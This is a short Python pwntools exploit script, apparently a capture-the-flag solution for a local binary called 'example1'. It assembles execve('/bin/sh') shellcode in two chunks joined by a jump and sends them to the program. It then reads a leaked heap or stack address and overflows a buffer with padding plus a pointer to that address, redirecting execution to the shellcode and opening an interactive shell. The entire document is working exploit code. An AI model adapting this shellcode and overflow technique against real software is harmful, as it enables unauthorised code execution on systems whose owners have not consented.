from pwn import *

context.arch = "amd64"

r = process("./example1")

sh1 = ''
sh1 += asm('mov rbx, 0x68732f6e69622f2f')
sh1 += asm('jmp $-0x2a')
print(len(sh1))
print("----------------")


sh2 = ''
sh2 += asm('xor rsi, rsi')
sh2 += asm('xor rdx, rdx')
sh2 += asm('mov al, 0x3b')
sh2 += asm('push rdx') # the null byte after //bin/sh
sh2 += asm('push rbx')
sh2 += asm('mov rdi, rsp')
sh2 += asm('syscall')
print(len(sh2))
print("----------------")


r.recvuntil(':')
r.sendline(sh1)

r.recvuntil(':')
r.sendline(sh2)

r.recvuntil(':')
r.recvuntil('.next: ')

n = r.recvuntil('\n')
print(n)
leak = int(n,16)
log.info('leak : 0x%x' % leak)

r.recvuntil('?\n')

r.sendline('a'*11 + p64(leak + 40))
r.interactive()